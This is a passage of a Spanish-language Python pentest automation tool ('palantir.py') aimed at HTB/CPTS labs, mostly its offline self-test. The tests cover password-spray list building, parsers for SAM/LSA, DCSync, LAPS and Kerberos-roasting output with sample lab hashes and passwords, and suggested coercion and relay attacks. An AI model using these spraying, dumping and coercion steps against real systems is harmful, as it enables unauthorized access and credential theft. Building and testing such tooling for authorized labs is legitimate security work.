<meta name="viewport" content="width=device-width,initial-scale=1">
<title>palantir · índice de {len(rows)} objetivos</title><style>{HTML_CSS}</style></head>
<body>
<header>
  <h1>palantir <span>· índice de objetivos</span></h1>
  <div class="sub">{len(rows)} objetivos · generado {datetime.now():%Y-%m-%d %H:%M}</div>
</header>
<div class="wrap">
  <div class="cards">{cards_html}</div>
  <details open><summary>Objetivos <span class="pill">{len(rows)}</span></summary>
    <div class="body">{tbl}</div></details>
  <footer>palantir.py · recon guiado por Nmap · uso solo en objetivos autorizados (labs HTB/CPTS)</footer>
</div>
</body></html>"""
    idx_path = Path(outdir) / "index.html"
    try:
        idx_path.write_text(out, encoding="utf-8")
        good(f"Índice de objetivos: {idx_path}")
    except OSError as e:
        err(f"no pude escribir el índice: {e}")


# ───────────────────────── Autotest (sin red) ─────────────────────────
SELFTEST_XML = """<?xml version="1.0"?><nmaprun><host>
<ports>
<port protocol="tcp" portid="22"><state state="open"/>
  <service name="ssh" product="OpenSSH" version="7.6p1" extrainfo="Ubuntu"/>
  <script id="ssh-hostkey" output="2048 aa:bb"/></port>
<port protocol="tcp" portid="80"><state state="open"/>
  <service name="http" product="Apache httpd" version="2.4.29"/>
  <script id="http-robots.txt" output="Disallow: /admin"/></port>
<port protocol="tcp" portid="445"><state state="open"/>
  <service name="microsoft-ds"/>
  <script id="smb-enum-shares" output="Anonymous access: READ"/></port>
<port protocol="tcp" portid="31337"><state state="open"/>
  <service name="Elite" method="table"/></port>
<port protocol="tcp" portid="9999"><state state="closed"/></port>
</ports>
<hostscript><script id="smb-os-discovery" output="OS: Windows 6.1; FQDN: dc01.inlanefreight.htb"/></hostscript>
</host></nmaprun>"""


def selftest():
    import tempfile
    with tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False) as f:
        f.write(SELFTEST_XML.replace("open/>", "open/>&#x1;"))          # cuela un char inválido
        tmp = f.name
    parsed = parse_nmap_xml(tmp)
    os.unlink(tmp)
    assert parsed is not None, "el char inválido petó el parseo"
    ports, host = parsed["ports"], parsed["host"]
    assert sorted(p["port"] for p in ports) == [22, 80, 445, 31337]      # 'closed' fuera
    assert host["smb-os-discovery"].startswith("OS: Windows")            # host scripts OK
    assert version_str(next(p for p in ports if p["port"] == 22)) == "OpenSSH 7.6p1 (Ubuntu)"
    assert parse_nmap_xml("/no/existe.xml") is None                      # fichero ausente → None

    def fake(product="", version="", extrainfo="", name="http", port=80, tunnel="", banner="", **sc):
        return {"product": product, "version": version, "extrainfo": extrainfo,
                "name": name, "port": port, "tunnel": tunnel, "banner": banner, "scripts": sc}
    assert ".aspx" in guess_extensions(fake(product="Microsoft IIS httpd"))
    lamp = guess_extensions(fake(product="Apache httpd", extrainfo="(Ubuntu)",
                                 **{"http-headers": "X-Powered-By: PHP/7.4"}))
    assert ".php" in lamp and ".cgi" in lamp and ".aspx" not in lamp
    assert ".jsp" in guess_extensions(fake(product="Apache Tomcat"))
    assert guess_extensions(fake()).startswith(".html,.txt")
    assert norm_ext("php,txt") == ".php,.txt" and norm_ext(".asp,aspx") == ".asp,.aspx"
    assert discover_domains(ports, host) == ["dc01.inlanefreight.htb"]
    assert base_domain("dc01.inlanefreight.htb") == "inlanefreight.htb"
    assert base_domain("www.hostgator.com.br") == "hostgator.com.br"   # ccTLD de 2º nivel
    assert base_domain("hostgator.com.br") == "hostgator.com.br"       # idempotente
    assert base_domain("foo.example.co.uk") == "example.co.uk"
    assert base_domain("example.com") == "example.com"                 # TLD normal, sin tocar
    assert WORDLIST_ALWAYS not in pick_wordlists(None, "quick", add_always=False)
    if Path(WORDLIST_ALWAYS).is_file():
        assert WORDLIST_ALWAYS in pick_wordlists(None, "quick")        # por defecto sí se añade
    assert _BAD_XML.sub("", "a&#x1;b") == "ab"                          # char-ref inválida fuera
    hl = highlight(ports, host)
    assert any("robots" in lbl for lbl, _ in hl)

    # Clasificación de protocolos
    assert classify(fake(name="microsoft-ds", port=445)) == "smb"
    assert classify(fake(name="", port=21)) == "ftp"
    assert classify(fake(name="unknown", port=30021, banner="220 ProFTPD Server (Internal FTP)")) == "ftp"  # puerto no estándar → por banner
    assert classify(fake(name="", port=40022, banner="SSH-2.0-OpenSSH_8.2p1")) == "ssh"
    # Regresión: un banner SMTP con 'ftp' como SUBSTRING del hostname (no el demonio) no debe
    # clasificarse como FTP solo por el fallback genérico "220 + 'ftp' en cualquier parte" —
    # el chequeo de SMTP (token menos ambiguo: 'esmtp'/'smtp') va ANTES de ese fallback.
    assert classify(fake(name="unknown", port=2525, banner="220 mail-ftp01.example.com ESMTP Postfix")) == "smtp"
    assert classify(fake(name="unknown", port=30021, banner="220 ftp server ready")) == "ftp"  # pero un FTP real SIGUE siendo FTP
    assert classify(fake(name="domain", port=53)) == "dns"
    assert classify(fake(name="", port=2049)) == "nfs"
    assert classify(fake(name="", port=161)) == "snmp"
    assert classify(fake(name="imap", port=143)) == "imap"
    assert classify(fake(name="redis", port=6379)) == "redis"
    assert classify(fake(name="", port=389)) == "ldap"
    assert classify(fake(name="rsync", port=873)) == "rsync"
    assert classify(fake(name="wsman", port=5985)) == "winrm"
    assert classify(fake(name="", port=5986)) == "winrm"
    assert classify(fake(name="ssh", port=22)) == "ssh"
    assert classify(fake(name="ms-wbt-server", port=3389)) == "rdp"
    assert classify(fake(name="vnc", port=5900)) == "vnc"
    assert classify(fake(name="", port=5901)) == "vnc"
    assert classify(fake(name="msrpc", port=135)) == "msrpc"
    assert classify(fake(name="ms-sql-s", port=1433)) == "mssql"      # SQL Server (la BD)
    assert classify(fake(name="ms-sql-m", port=1434)) is None         # SQL Browser (udp), NO es la BD
    assert _ONESIXTYONE_RE.findall("10.0.0.1 [backup] Linux NIXHARD x86_64\n10.0.0.1 [public] foo") == ["backup", "public"]
    assert classify(fake(name="exec", port=512)) == "rservices"
    assert classify(fake(name="login", port=513)) == "rservices"
    assert classify(fake(name="", port=514)) == "rservices"
    assert classify(fake(name="http", port=80)) is None
    assert not is_web(fake(name="wsman", port=5985))     # WinRM no se fuzzea como web
    assert not is_web(fake(name="http", port=47001))     # 47001 = listener HTTP de WinRM
    assert not is_web(fake(name="http", product="Microsoft HTTPAPI httpd", port=8080))  # HTTP.sys, no web real
    assert is_web(fake(name="http", port=8080))
    assert is_web(fake(name="unknown", port=3000))       # puerto web típico (dev server) sin fingerprint de nmap → web
    assert not is_web(fake(name="unknown", port=2222))   # puerto no web desconocido → NO se fuzzea
    # detección de IIS para el mini-recon web
    assert _is_iis(fake(product="Microsoft IIS httpd", version="10.0"))
    assert _is_iis(fake(name="http", **{"http-headers": "X-Powered-By: ASP.NET"}))
    assert _is_iis(fake(name="http", **{"http-headers": "X-AspNet-Version: 4.0.30319"}))
    assert not _is_iis(fake(product="Apache httpd"))
    assert not _is_iis(fake(product="Microsoft HTTPAPI httpd", version="2.0"))  # HTTPAPI NO es IIS
    nse = _nse_for(ports, host, ("smb", "nbstat"))
    assert any("smb-enum-shares" in lbl for lbl, _ in nse)

    # Nuevos protocolos + motor de credenciales por defecto (Fase 5c), sin tocar la red
    assert classify(fake(name="postgresql", port=5432)) == "postgres"
    assert classify(fake(name="", port=5432)) == "postgres"
    assert classify(fake(name="mongodb", port=27017)) == "mongodb"
    assert classify(fake(name="", port=27017)) == "mongodb"
    assert classify(fake(name="telnet", port=23)) == "telnet"
    assert classify(fake(name="", port=23)) == "telnet"
    assert classify(fake(name="", port=9200)) == "elastic"
    assert classify(fake(name="", port=11211)) == "memcached"
    assert classify(fake(name="", port=5984)) == "couchdb"
    assert classify(fake(name="", port=8009)) == "ajp"
    assert classify(fake(name="", port=1099)) == "rmi"
    assert classify(fake(name="", port=88)) == "kerberos"
    assert classify(fake(name="", port=2375)) == "docker" and classify(fake(name="", port=2376)) == "docker"
    assert classify(fake(name="", port=69)) == "tftp"
    assert classify(fake(name="", port=123)) == "ntp"
    # _all_findings: en --resume los findings vienen como listas (JSON) → deben normalizarse a
    # tupla y deduplicarse sin reventar (antes: TypeError al meter una lista en un set).
    assert _all_findings([], {}, [{"findings": [["alta", "x"], ["alta", "x"]]}], []) == [("alta", "x")]
    assert _mysql_ok(0, "1")
    assert not _mysql_ok(0, "ERROR 1045 (28000): Access denied for user 'root'@'host'")
    assert not _mysql_ok(1, "")
    assert _psql_ok(0, "1")
    assert not _psql_ok(2, 'psql: error: FATAL:  password authentication failed for user "postgres"')
    assert _snmp_ok("iso.3.6.1.2.1.1.1.0 = STRING: Linux kali 6.1.0")
    assert not _snmp_ok("Timeout: No Response from 10.10.10.10")
    assert _tomcat_ok(200, "<title>Tomcat</title> Web Application Manager — List Applications / Deploy")
    assert not _tomcat_ok(401, "")
    assert not _tomcat_ok(200, "<html>Index of /</html>")
    import base64 as _b64
    assert _b64.b64decode(_basic_auth_header("tomcat", "tomcat").split()[1]).decode() == "tomcat:tomcat"
    assert _is_tomcat(fake(product="Apache Tomcat/Coyote JSP engine", name="http"))
    assert not _is_tomcat(fake(product="nginx", name="http"))
    for _pr, _lst in DEFAULT_CREDS.items():
        for _it in _lst:
            assert len(_it) == 3, f"cred mal formada en {_pr}: {_it}"
    assert {"ftp", "ssh", "smb", "mysql", "postgres", "mssql", "snmp", "ipmi"} <= set(_CC_DISPATCH)
    # Enumeración de BBDD con credencial: parser de impacket-mssqlclient (la cabecera va pegada al
    # prompt en modo no-tty → se filtra; ERROR/guiones/estado fuera) + listas de BBDD de sistema.
    _mssql_out = ("\nSQL (WIN-HARD\\Fiona  guest@master)> name        \n---------   \n"
                  "master      \ntempdb      \nmodel       \nmsdb        \nTestingDB   \nTestAppDB   \n"
                  "SQL (WIN-HARD\\Fiona  guest@master)> \n")
    assert _parse_mssqlclient_col(_mssql_out) == ["master", "tempdb", "model", "msdb", "TestingDB", "TestAppDB"]
    assert _parse_mssqlclient_col('ERROR(X): Line 1: ... is not able to access the database "model"\n') == []
    assert "master" in _DB_SYSTEM["mssql"] and "information_schema" in _DB_SYSTEM["mysql"] and "template0" in _DB_SYSTEM["postgres"]
    # _pwn_clause: (Pwn3d!) = admin real solo en SMB/WinRM/WMI/MSSQL/LDAP; en RDP/VNC es solo acceso
    assert _pwn_clause("smb")[0] == "critica" and "ADMINISTRADOR" in _pwn_clause("smb")[1]
    assert _pwn_clause("mssql")[0] == "critica"
    assert _pwn_clause("rdp")[0] == "alta" and "NO admin" in _pwn_clause("rdp")[1]
    assert _pwn_clause("vnc")[0] == "alta"
    # Zerologon / GPP: substrings EXACTOS confirmados en el código fuente de nxc (no un ejemplo
    # de un blog) — "VULNERABLE" y "Attack failed..." no comparten texto, así que el check de
    # fp_smb (`"VULNERABLE" in out`) no da falsos positivos contra la frase de "parcheado".
    assert "VULNERABLE" in "VULNERABLE\nNext step: https://github.com/dirkjanm/CVE-2020-1472"
    assert "VULNERABLE" not in "Attack failed. Target is probably patched."
    assert "Found credentials in" in "Found \\\\dc\\\\SYSVOL\\\\x\\\\Groups.xml\nFound credentials in \\\\dc\\\\SYSVOL\\\\x\\\\Groups.xml\nPassword: x"
    assert "Found credentials in" not in "Searching SYSVOL share for potential XML files containing passwords"
    # _parse_laps_hits: formato real de nxc/modules/laps.py — 'User:' viene con el usuario
    # rellenado a 15 caracteres (de ahí el '\s+' del regex: puede haber varios espacios antes
    # de 'Password:', no uno solo). Varias líneas → varios equipos; sin 'Password:' no hay hit.
    assert _parse_laps_hits(
        "Getting LAPS Passwords\n"
        "Computer:WS01$ User:Administrator      Password:AbCdEf123!\n"
        "Computer:WS02$ User:Administrator      Password:GhIjKl456?\n"
    ) == [("WS01$", "AbCdEf123!"), ("WS02$", "GhIjKl456?")]
    assert _parse_laps_hits("Getting LAPS Passwords") == []
    assert _parse_laps_hits("") == []
    assert _parse_laps_hits("No result found with attribute ms-MCS-AdmPwd or msLAPS-Password !") == []
    # _secretsdump_hash: DCSync-rights check (secretsdump.py -just-dc-user krbtgt) — mismo
    # formato 'usuario:RID:lm:nt:::' que _parse_nxc_sam; sin derechos, la cuenta pedida NUNCA
    # aparece en la salida (se queda en el error RPC de la fase DRSUAPI, no en una línea vacía).
    assert _secretsdump_hash(
        "[*] Using the DRSUAPI method to get NTDS.DIT secrets\n"
        "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7f8c53aa1f8c4e5b3b6a1d8e2f9c0a1b:::\n"
        "[*] Kerberos keys grabbed\n", "krbtgt") == "7f8c53aa1f8c4e5b3b6a1d8e2f9c0a1b"
    assert _secretsdump_hash("[-] RPC_S_ACCESS_DENIED", "krbtgt") is None
    assert _secretsdump_hash("", "krbtgt") is None
    # no confunde a OTRA cuenta con el mismo sufijo de nombre (p. ej. 'krbtgt' dentro de 'svc_krbtgt')
    assert _secretsdump_hash("svc_krbtgt:1105:aad3b435b51404eeaad3b435b51404ee:"
                             "00000000000000000000000000000000:::", "krbtgt") is None
    # _parse_adidnsdump_csv: DNS interno vía LDAP (records.csv) — cabecera y registros sin
    # resolver ('?,?') se descartan; formato confirmado en el código fuente de adidnsdump
    # (dnsdump.py): 'type,name,value' sin comillas/escapado.
    assert _parse_adidnsdump_csv(
        "type,name,value\n"
        "A,DC01,172.16.5.5\n"
        "CNAME,webmail,mail1.inlanefreight.local\n"
        "?,?,?\n"
    ) == [("A", "DC01", "172.16.5.5"), ("CNAME", "webmail", "mail1.inlanefreight.local")]
    assert _parse_adidnsdump_csv("") == []
    assert _parse_adidnsdump_csv("type,name,value\n") == []
    # recon web automatizado (solo lectura) + MongoDB, sin tocar la red
    assert _web_file_hit(200, "Error Log for SILO -- Powered by ELMAH", r"Error Log for|ELMAH")
    assert not _web_file_hit(200, "<html>404 personalizado</html>", r"Error Log for|ELMAH")
    assert not _web_file_hit(404, "Error Log for", r"Error Log for")
    assert _web_file_hit(200, "<configuration><connectionStrings>", r"<configuration|<\?xml")
    assert _dangerous_methods("OPTIONS, TRACE, GET, HEAD, POST") == ["TRACE"]
    assert set(_dangerous_methods("GET, PUT, DELETE, MOVE")) == {"PUT", "DELETE", "MOVE"}
    assert _dangerous_methods("GET, POST, HEAD") == []
    # _missing_security_headers: HSTS solo cuenta en https; X-Frame-Options Y CSP
    # frame-ancestors son intercambiables (falta solo si NINGUNA de las dos está);
    # con todo presente, no hay hallazgos.
    _msh_none = {"strict-transport-security": "max-age=31536000", "x-content-type-options": "nosniff",
                 "content-security-policy": "default-src 'self'; frame-ancestors 'self'",
                 "x-frame-options": "DENY"}
    assert _missing_security_headers("https", _msh_none) == []
    _msh_bare = _missing_security_headers("https", {})
    assert {lbl for lbl, _s, _w in _msh_bare} == {
        "HSTS (Strict-Transport-Security)", "X-Content-Type-Options", "Content-Security-Policy",
        "X-Frame-Options / CSP frame-ancestors"}
    assert all(sev in ("media", "info") for _l, sev, _w in _msh_bare)
    # HTTP puro (no https): HSTS no se pide (no tiene sentido sin TLS de por medio).
    _msh_http = _missing_security_headers("http", {})
    assert "HSTS (Strict-Transport-Security)" not in {lbl for lbl, _s, _w in _msh_http}
    # CSP con frame-ancestors cubre la falta de X-Frame-Options (no son hallazgos separados).
    assert "X-Frame-Options / CSP frame-ancestors" not in {
        lbl for lbl, _s, _w in _missing_security_headers(
            "https", {"content-security-policy": "frame-ancestors 'none'"})}
    for _grp, _lst in WEB_SENSITIVE.items():
        for _it in _lst:
            assert len(_it) == 3
    assert _mongo_ok('{ "databases": [ { "name": "admin" } ], "totalSize": 1 }')
    assert not _mongo_ok("MongoServerError: command listDatabases requires authentication")
    for _t, _v in TOOL_PKGS.items():
        assert len(_v) == 3 and isinstance(_v[2], tuple), f"TOOL_PKGS mal formado: {_t}"

    # Detección de DC + parseo de RID cycling (sin tocar la red)
    assert is_domain_controller([{"port": 445}, {"port": 88}])           # Kerberos → DC
    assert is_domain_controller([{"port": 389}, {"port": 139}])          # LDAP + SMB → DC
    assert not is_domain_controller([{"port": 445}, {"port": 139}])      # SMB solo → no
    assert not is_domain_controller([{"port": 80}, {"port": 22}])
    # Fase 5d: parse_provided_creds (user:pass, ':' en la pass, dedup) + dominio + sanitize + rpcdump
    import types as _types
    def _pc(**kw):   # args de sobra para parse_provided_creds/confirm_creds_spray (defaults razonables)
        kw.setdefault("user", None); kw.setdefault("password", None)
        kw.setdefault("user_list", None); kw.setdefault("pass_list", None)
        kw.setdefault("creds_file", None); kw.setdefault("jobs", 1)
        kw.setdefault("no_bruteforce", False); kw.setdefault("hash", None)
        return _types.SimpleNamespace(**kw)
    assert parse_provided_creds(_pc(user="alex", password="pw:1")) == [("alex", "pw:1")]
    assert parse_provided_creds(_pc()) == []
    # --hash/-H (pass-the-hash): el "secreto" suelto pasa a ser el hash (el par sigue siendo (user, secreto))
    assert parse_provided_creds(_pc(user="evil", hash="31d6cfe0d16ae931b73c59d7e0c089c0")) == \
        [("evil", "31d6cfe0d16ae931b73c59d7e0c089c0")]

    def _tmpfile(text):
        f = tempfile.NamedTemporaryFile("w", delete=False, encoding="utf-8")
        f.write(text); f.close()
        return f.name

    # --user-list/-U + --pass-list/-P: CRUZAN las dos listas (todas las combinaciones)
    _ul = _tmpfile("alice\n# comentario\nbob\n\n")
    _pl = _tmpfile("Summer2024\nWinter2024\n")
    assert _read_cred_list(_ul, "--user-list") == ["alice", "bob"]   # '#' y líneas vacías fuera
    assert set(parse_provided_creds(_pc(user_list=_ul, pass_list=_pl))) == {
        ("alice", "Summer2024"), ("alice", "Winter2024"), ("bob", "Summer2024"), ("bob", "Winter2024")}
    # solo -U (sin -P ni --pass): cada usuario de la lista, contraseña vacía
    assert set(parse_provided_creds(_pc(user_list=_ul))) == {("alice", ""), ("bob", "")}
    # solo -P (sin -U ni --user): no hay a quién probarlo, lista vacía (hace falta un usuario)
    assert parse_provided_creds(_pc(pass_list=_pl)) == []
    # -U cruzada con un --pass suelto (no con -P): mismo password para cada usuario de la lista
    assert set(parse_provided_creds(_pc(user_list=_ul, password="x"))) == {("alice", "x"), ("bob", "x")}
    # Windows: usuarios case-insensitive → 'Fiona'/'fiona' colapsan (no duplican intentos ni hallazgos); en Linux NO
    assert _dedup_ci(["Fiona", "fiona", "John", "FIONA", "john"]) == ["Fiona", "John"]
    _ulc = _tmpfile("Fiona\nfiona\nJohn\n")
    assert set(parse_provided_creds(_pc(user_list=_ulc, password="x"), windows=True)) == {("Fiona", "x"), ("John", "x")}
    assert set(parse_provided_creds(_pc(user_list=_ulc, password="x"))) == {("Fiona", "x"), ("fiona", "x"), ("John", "x")}  # sin windows (Linux): no colapsa
    os.unlink(_ulc)
    # se combina con --creds-file (pares explícitos, SIN cruzar) sin perder ninguno
    _cf = _tmpfile("carol:Pass123\n")
    _merged = parse_provided_creds(_pc(user_list=_ul, pass_list=_pl, creds_file=_cf))
    assert ("carol", "Pass123") in _merged and len(_merged) == 5   # 4 cruzadas + 1 del creds-file
    for _f in (_ul, _pl, _cf):
        os.unlink(_f)
    assert _read_cred_list("/no/existe/lista.txt", "--user-list") == []   # fichero ausente: avisa, no peta

    # --no-bruteforce: empareja línea a línea (users[i] con passwords[i]) en vez de cruzar
    _ulb = _tmpfile("alice\nbob\n")
    _plb = _tmpfile("alice\nbob\n")   # mismo contenido que _ulb: contraseña = usuario
    assert set(parse_provided_creds(_pc(user_list=_ulb, pass_list=_plb, no_bruteforce=True))) == \
        {("alice", "alice"), ("bob", "bob")}   # NO (alice,bob)/(bob,alice): eso sería el cruce
    # listas de distinta longitud: avisa y empareja solo hasta la más corta, no peta
    _plb_short = _tmpfile("soloUna\n")
    assert parse_provided_creds(_pc(user_list=_ulb, pass_list=_plb_short, no_bruteforce=True)) == \
        [("alice", "soloUna")]
    # --no-bruteforce sin las DOS listas de fichero (solo -U, con --pass suelto): sin efecto, sigue cruzando
    assert set(parse_provided_creds(_pc(user_list=_ulb, password="x", no_bruteforce=True))) == \
        {("alice", "x"), ("bob", "x")}
    for _f in (_ulb, _plb, _plb_short):
        os.unlink(_f)

    # _probe_lockout_policy: sin nxc instalado, best-effort y sin tocar la red
    _real_nxc_bin = nxc_bin
    globals()["nxc_bin"] = lambda: None
    try:
        assert _probe_lockout_policy("10.0.0.1") == (False, None, "nxc/netexec no está instalado")
    finally:
        globals()["nxc_bin"] = _real_nxc_bin

    # _parse_nxc_bulk_successes: varias líneas de éxito en una sola salida de nxc en modo
    # bulk — Pwn3d!/normal/sin-usuario-parseable/fallo, todo en el mismo texto. También
    # extrae la contraseña ganadora (necesaria para encadenar el volcado SAM/LSA automático
    # sin tener que volver a probar la lista entera).
    _bulk_out = (
        "SMB  10.0.0.1 445 DC01 [+] CORP\\alice:Summer2024 (Pwn3d!)\n"
        "SMB  10.0.0.1 445 DC01 [-] CORP\\bob:Winter2024 STATUS_LOGON_FAILURE\n"
        "SMB  10.0.0.1 445 DC01 [+] CORP\\carol:Spring2024\n"
        "SMB  10.0.0.1 445 DC01 [+] formato-inesperado-sin-usuario\n"
    )
    _hits = _parse_nxc_bulk_successes(_bulk_out)
    assert len(_hits) == 3   # el STATUS_LOGON_FAILURE no cuenta como éxito
    assert {"user": "alice", "password": "Summer2024", "pwn3d": True} in _hits
    assert {"user": "carol", "password": "Spring2024", "pwn3d": False} in _hits
    assert any(h["user"] is None and h["password"] is None for h in _hits)   # línea con [+] pero sin patrón usuario:pass → no se pierde, ambos None
    assert _parse_nxc_bulk_successes("nada por aquí") == []
    # Contraseña con ESPACIOS (línea de wordlist sin limpiar, «Windows Creds») → NO se trunca en el
    # primer espacio; y el guest-mapping « (Guest)» NO cuenta como login real (falso positivo).
    _sp = _parse_nxc_bulk_successes(
        "SMB 10.0.0.1 445 WIN [+] WIN\\john:Windows Creds\n"
        "SMB 10.0.0.1 445 WIN [+] WIN\\dave:correct horse battery (Pwn3d!)\n"
        "SMB 10.0.0.1 445 WIN [+] WIN\\simon:loquesea (Guest)\n")
    assert {"user": "john", "password": "Windows Creds", "pwn3d": False} in _sp
    assert {"user": "dave", "password": "correct horse battery", "pwn3d": True} in _sp
    assert not any(h["user"] == "simon" for h in _sp)   # (Guest) descartado

    # Regresión con ruido REAL capturado contra un objetivo: el módulo SSH de nxc (bug
    # conocido de paramiko, NetExec#312) mete líneas 'ERROR Internal Paramiko error for
    # user:pass, Error reading SSH protocol banner...' sueltas entre los '[-]' normales.
    # No llevan '[+]' → deben quedar fuera sin romper el parseo de lo que SÍ hay alrededor
    # (aquí ningún '[+]' real, pero si lo hubiera entre el ruido, debe seguir saliendo).
    _ssh_noise = (
        "SSH         10.129.202.136  22     10.129.202.136   [-] chris:123456\n"
        "[13:10:54] ERROR    Internal Paramiko error for dennis:12345, Error reading SSH "
        "protocol banner[Errno 104] Connection reset by peer                       ssh.py:134\n"
        "SSH         10.129.202.136  22     10.129.202.136   [-] jerome:12345\n"
        "SSH         10.129.202.136  22     10.129.202.136   [+] john:Summer2024! (Pwn3d!)\n"
        "           ERROR    Internal Paramiko error for chris:password, Error reading SSH "
        "protocol banner[Errno 104] Connection reset by peer                       ssh.py:134\n"
    )
    _ssh_hits = _parse_nxc_bulk_successes(_ssh_noise)
    assert _ssh_hits == [{"user": "john", "password": "Summer2024!", "pwn3d": True}]   # el ruido no tapa el único [+] real ni cuela falsos positivos

    # _parse_nxc_sam / _parse_nxc_lsa: formato REAL de un volcado contra un objetivo HTB
    # (Windows standalone, cuenta local 'bob' con password reuse) — capturado en vivo.
    _sam_out = (
        "SMB         10.129.4.104    445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FrontDesk01) (signing:False) (SMBv1:None)\n"
        "SMB         10.129.4.104    445    FRONTDESK01      [+] FrontDesk01\\bob:HTB_@cademy_stdnt! (Pwn3d!)\n"
        "SMB         10.129.4.104    445    FRONTDESK01      [*] Dumping SAM hashes\n"
        "SMB         10.129.4.104    445    FRONTDESK01      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
        "SMB         10.129.4.104    445    FRONTDESK01      bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::\n"
        "SMB         10.129.4.104    445    FRONTDESK01      [+] Added 2 SAM hashes to the database\n"
    )
    _sam_accs = _parse_nxc_sam(_sam_out)
    assert len(_sam_accs) == 2
    assert any(a["user"] == "Administrator" and a["blank"] for a in _sam_accs)   # hash NT nulo → contraseña vacía
    assert any(a["user"] == "bob" and not a["blank"] and a["nt_hash"] == "3c0e5d303ec84884ad5c3b7876a06ea6" for a in _sam_accs)
    assert _parse_nxc_sam("nada por aquí") == []

    _lsa_out = (
        "SMB         10.129.4.104    445    FRONTDESK01      [*] Windows 10 / Server 2019 Build 18362 x64 (name:FRONTDESK01) (domain:FrontDesk01) (signing:False) (SMBv1:None)\n"
        "SMB         10.129.4.104    445    FRONTDESK01      [+] FrontDesk01\\bob:HTB_@cademy_stdnt! (Pwn3d!)\n"
        "SMB         10.129.4.104    445    FRONTDESK01      [*] Dumping LSA secrets\n"
        "SMB         10.129.4.104    445    FRONTDESK01      dpapi_machinekey:0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce\n"
        "dpapi_userkey:0x50b9fa0fd79452150111357308748f7ca101944a\n"
        "SMB         10.129.4.104    445    FRONTDESK01      frontdesk:Password123\n"
        "SMB         10.129.4.104    445    FRONTDESK01      [+] Dumped 2 LSA secrets to /tmp/x.secrets and /tmp/x.cached\n"
    )
    _lsa = _parse_nxc_lsa(_lsa_out)
    assert _lsa["dpapi"] == [("dpapi_machinekey", "0xc03a4a9b2c045e545543f3dcb9c181bb17d6bdce"),
                             ("dpapi_userkey", "0x50b9fa0fd79452150111357308748f7ca101944a")]
    assert _lsa["creds"] == [("frontdesk", "Password123")]
    assert _lsa["nlkm"] == [] and _lsa["raw"] == []   # el banner/marcadores/Pwn3d! no se cuelan como "raw"
    assert _parse_nxc_lsa("nada por aquí") == {"dpapi": [], "nlkm": [], "creds": [], "raw": ["nada por aquí"]}

    # roasting (nxc --asreproast/--kerberoasting) y spider de contenido: parsers puros (sin red)
    assert _count_roast("$krb5asrep$23$u@DOM:abc\n$krb5tgs$23$*svc$DOM$def") == 2
    assert _count_roast("sin hashes") == 0
    _spider_out = ("SMB 10.0.0.1 445 DC [*] Started spidering\n"
                   "//Finance/budget.xlsx [lastm:'2024-01-01 10:00' size:1024]\n"
                   "//Finance/creds.txt [lastm:'2024-02-02 11:00' size:64]\n"
                   "SMB 10.0.0.1 445 DC [*] Done spidering (Completed in 1s)")
    assert _parse_spider_hits(_spider_out) == ["//Finance/budget.xlsx", "//Finance/creds.txt"]
    assert _parse_spider_hits("[*] Started spidering\nSMB 10.0.0.1 445 DC [+] DC\\user:") == []  # banner/estado no cuela

    # fp_msrpc: si rpcdump.py revela MS-RPRN/MS-PAR (spooler expuesto), ahora es un hallazgo
    # 'alta' (antes quedaba enterrado en el output crudo + sugerencia genérica de grep) y el
    # next-step pasa de "¿lo tiene?" a "ya sabemos que sí, coacciona autenticación". nxc_bin
    # ausente a propósito: no se quiere mockear todo nxc_auth solo para esto.
    _real_nxc_bin4, _real_rpcdump_bin, _real_rc4 = nxc_bin, _rpcdump_bin, run_capture
    globals()["nxc_bin"] = lambda: None
    globals()["_rpcdump_bin"] = lambda: "FAKE_RPCDUMP"

    def _fake_rpcdump_rc(cmd, timeout=None, **kw):
        assert cmd[0] == "FAKE_RPCDUMP"
        return 0, ("Protocol: [MS-RPRN]: Print System Remote Protocol \n"
                   "Bindings: \n"
                   "          ncacn_np:WIN-SRV[\\PIPE\\spoolss] \n"
                   "Protocol: [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol \n"
                   "Bindings: \n"
                   "          ncacn_ip_tcp:WIN-SRV[49152] \n")
    globals()["run_capture"] = _fake_rpcdump_rc
    try:
        _msvc = [{"port": 135, "name": "msrpc", "scripts": {}}]
        _mres = fp_msrpc("10.0.0.1", _msvc, _msvc, {}, False)
    finally:
        globals()["nxc_bin"], globals()["_rpcdump_bin"], globals()["run_capture"] = \
            _real_nxc_bin4, _real_rpcdump_bin, _real_rc4
    assert any(s == "alta" and "PrinterBug" in t for s, t in _mres["findings"])
    assert any(s == "alta" and "PetitPotam" in t and "MS-EFSR" in t for s, t in _mres["findings"])
    assert any("petitpotam" in n or "coercer" in n for n in _mres["next"])   # ya confirmado: sugerencia de explotación, no de comprobación
    assert any("MS-RPRN/MS-PAR/MS-EFSR" in n for n in _mres["next"])         # las dos superficies confirmadas, no solo una
    assert not any("grep -iE" in n for n in _mres["next"])                  # la sugerencia de "a ver si lo tiene" ya no hace falta
    assert any("certsrv" in n and "ESC8" in n for n in _mres["next"])       # relay hacia AD CS sugerido, no solo LDAP
    assert any("cube0x0" in n and "CVE-2021-1675" in n for n in _mres["next"])  # PrintNightmare: spooler expuesto, fork necesario
    # solo MS-EFSR (sin spooler): el next-step no debe mencionar MS-RPRN/MS-PAR ni PrintNightmare
    # (ese necesita el spooler en sí, no solo la coacción EFSR) si no se vio
    globals()["nxc_bin"], globals()["_rpcdump_bin"] = lambda: None, lambda: "FAKE_RPCDUMP"
    globals()["run_capture"] = lambda cmd, timeout=None, **kw: (
        0, "Protocol: [MS-EFSR]: Encrypting File System Remote (EFSRPC) Protocol \n")
    try:
        _mres2 = fp_msrpc("10.0.0.1", _msvc, _msvc, {}, False)
    finally:
        globals()["nxc_bin"], globals()["_rpcdump_bin"], globals()["run_capture"] = \
            _real_nxc_bin4, _real_rpcdump_bin, _real_rc4
    assert not any("PrinterBug" in t for _, t in _mres2["findings"])
    assert any("MS-EFSR ya confirmado" in n for n in _mres2["next"])
    assert not any("cube0x0" in n for n in _mres2["next"])   # sin spooler expuesto: no sugiere PrintNightmare

    # fp_ldap: get-desc-users (nombre ACTUAL del módulo nxc; antes se sugería el viejo
